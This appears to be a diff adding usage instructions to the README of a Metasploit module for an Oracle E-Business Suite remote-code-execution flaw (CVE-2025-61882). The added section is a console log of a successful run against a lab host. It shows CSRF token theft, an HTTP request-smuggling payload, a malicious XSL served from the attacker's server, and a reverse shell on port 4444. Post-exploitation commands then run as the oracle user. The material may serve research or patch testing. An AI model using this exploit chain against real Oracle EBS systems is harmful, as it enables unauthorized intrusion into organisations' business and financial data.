@@ -49,6 +49,44 @@ use exploit/multi/http/oracle_ebs_cve_2025_61882_rce
 **4. Configure the required parameters**
 <img width="899" height="573" alt="options-oracle-EBS-metasploit-module" src="https://github.com/user-attachments/assets/22aea551-1f83-44ba-8ea1-153550fd6d48" />
 
+**5.Check or Exploit**
+
+```
+msf6 exploit(multi/http/oracle_ebs_cve_2025_61882_exploit_rce) > check
+[*] 192.168.56.104:8000 - The target appears to be vulnerable.
+
+
+msf6 exploit(multi/http/oracle_ebs_cve_2025_61882_exploit_rce) > exploit
+[*] Exploit running as background job 7.
+[*] Exploit completed, but no session was created.
+
+[*] Started reverse TCP handler on 192.168.56.1:4444 
+[*] Starting HTTP server on 0.0.0.0:1337
+[*] Using URL: http://192.168.56.1:1337/
+[*] XSL payload will be served at: http://192.168.56.1:1337/HexdwvgO.xsl
+[*] Retrieving CSRF token from target...
+[+] CSRF token retrieved: 86AJ-2RR3-XDNC-U9I4-Y...
+[*] Creating HTTP request smuggling payload...
+[*] Triggering exploitation via UiServlet...
+[+] Received request: GET /OA_HTML/ieshostedsurvey.xsl from 192.168.56.104:63162
+[+] Serving  XSL payload to 192.168.56.104...
+[+] XSL payload delivered successfully to 192.168.56.104 (1460 bytes)
+[*] Keeping HTTP server alive, waiting for callback to 192.168.56.1:4444...
+[*] (Press Ctrl-C to stop)
+[*] Waiting up to 30 seconds for reverse shell connection...
+[+] Session created successfully!
+[*] Server stopped.
+[*] Command shell session 1 opened (192.168.56.1:4444 -> 192.168.56.104:61062) at 2025-12-04 09:14:42 +0100
+sessions 7
+[*] Starting interaction with 7...
+
+id
+uid=54321(oracle) gid=54321(oinstall) groups=54321(oinstall),54322(dba) context=system_u:system_r:initrc_t:s0
+uname -a
+Linux apps 5.4.17-2136.338.4.2.el7uek.x86_64 #3 SMP Mon Dec 23 14:42:43 PST 2024 x86_64 x86_64 x86_64 GNU/Linux
+pwd
+/u01/install/APPS/fs1/FMW_Home/user_projects/domains/EBS_domain
+```
 
 ## Tips for Oracle EBS Sandbox setup
 
